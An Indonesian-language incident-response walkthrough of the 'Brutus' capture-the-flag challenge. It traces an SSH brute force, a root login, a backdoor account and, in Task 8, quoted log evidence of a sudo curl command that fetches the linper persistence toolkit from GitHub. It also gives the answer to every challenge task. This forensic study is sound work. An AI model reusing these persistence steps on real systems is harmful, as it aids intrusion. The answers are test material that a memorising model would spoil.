## 📝 Informasi Challenge
* **Nama Challenge**: Brutus
* **Kesulitan**: very easy
* **Kategori**: Digital Forensics & Incident Response (DFIR)
* **Author**: cyberjunkie

### 📖 Sherlock Scenario
Sebuah server Linux berbasis AWS terdeteksi mengalami aktivitas mencurigakan. Sebagai seorang analis keamanan, tugas kita adalah menganalisis file `auth.log` dan hasil parsing `wtmp` untuk melacak jejak penyerang, mengidentifikasi metode akses mereka, dan menemukan tindakan persistensi yang mereka lakukan di dalam sistem.

---

## 🔍 Analisis Step-by-Step

### Task 1: IP Address Penyerang
**Pertanyaan**: Berapa alamat IP yang digunakan penyerang untuk melakukan serangan brute force?

**Analisis**: Dalam `auth.log`, terlihat ribuan percobaan login gagal dalam waktu yang sangat singkat (beberapa percobaan per detik) dari IP yang sama.<br>
**Bukti Log**: `sshd[2325]: Invalid user admin from 65.2.161.68 port 46380`.<br>
**Materi**: Serangan *Brute Force* SSH ditandai dengan log `Invalid user` atau `Failed password` yang berulang dari satu sumber IP.<br>
**Jawaban**: `65.2.161.68`

---

### Task 2: Akun yang Berhasil Ditembus
**Pertanyaan**: Akun mana yang berhasil diakses oleh penyerang?

**Analisis**: Kita perlu mencari entri `Accepted password` yang berasal dari IP penyerang.<br>
**Bukti Log**: `sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2`.<br>
**Materi**: Status `Accepted password` menunjukkan bahwa kredensial yang dimasukkan valid dan sesi SSH berhasil dibuka.<br>
**Jawaban**: `root`

---

### Task 3: Timestamp Login Manual (UTC)
**Pertanyaan**: Kapan penyerang login secara manual dan membuka sesi terminal?

**Analisis**: Log `Accepted password` pertama pada 06:31:40 adalah bot otomatis (sesi langsung ditutup di detik yang sama). Login manual yang bertahan lama tercatat di `wtmp` pada pukul 13:32:45.<br>
**Bukti Log**: `"USER" "2549" "pts/1" "ts/1" "root" "65.2.161.68" ... "2024/03/06 13:32:45"`.<br>
**Materi**: File `wtmp` mencatat sesi login interaktif (USER) dan kapan sesi tersebut berakhir (DEAD).<br>
**Jawaban**: `2024-03-06 13:32:45`

---

### Task 4: SSH Session Number
**Pertanyaan**: Berapa nomor sesi yang diberikan untuk akun yang ditembus penyerang?

**Analisis**: Saat penyerang login manual pada 06:32:44, layanan `systemd-logind` memberikan ID sesi baru.<br>
**Bukti Log**: `systemd-logind[411]: New session 37 of user root.`<br>
**Materi**: Setiap sesi login SSH di Linux modern ditandai dengan nomor unik oleh `systemd-logind`. <br>
**Jawaban**: `37`

---

### Task 5: Akun Persistensi (Persistence)
**Pertanyaan**: Apa nama akun baru yang dibuat oleh penyerang?

**Analisis**: Setelah masuk sebagai root, penyerang membuat user baru untuk cadangan akses.<br>
**Bukti Log**: `useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002`.<br>
**Materi**: Pembuatan user baru adalah teknik umum agar penyerang tetap bisa masuk meskipun password root diubah.<br>
**Jawaban**: `cyberjunkie`

---

### Task 6: MITRE ATT&CK Sub-technique
**Pertanyaan**: Apa ID sub-teknik MITRE ATT&CK untuk pembuatan akun baru ini?

**Analisis**: Berdasarkan dokumentasi MITRE, pembuatan akun lokal masuk dalam teknik *Create Account*.<br>
**Materi**: `T1136` adalah *Create Account*, dan `.001` merujuk pada *Local Account*.<br>
* **Jawaban**: `T1136.001`

---

### Task 7: Waktu Akhir Sesi SSH Pertama
**Pertanyaan**: Jam berapa sesi SSH pertama penyerang berakhir menurut auth.log?

**Analisis**: Sesi pertama (Session 34) dibuka pada 06:31:40 dan langsung ditutup.<br>
**Bukti Log**: `Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session closed for user root`.<br>
**Jawaban**: `06:31:40` 

---

### Task 8: Perintah Sudo (Download Script)
**Pertanyaan**: Apa perintah lengkap yang dijalankan menggunakan sudo untuk mendownload script?

**Analisis**: Penyerang menggunakan user `cyberjunkie` dan hak akses `sudo` untuk mengambil script dari internet. <br>
**Bukti Log**: `COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`. <br>
**Materi**: `curl` sering digunakan untuk mengunduh skrip eksekusi langsung dari repositori publik seperti GitHub. <br>
**Jawaban**: `sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` <br>

---

## 💡 Kesimpulan Investigasi
Serangan dimulai dengan **Brute Force** terhadap berbagai layanan user. Setelah mendapatkan akses **root**, penyerang melakukan **Persistence** dengan membuat user **cyberjunkie** dan mengunduh toolkit audit/persistensi menggunakan **curl**.
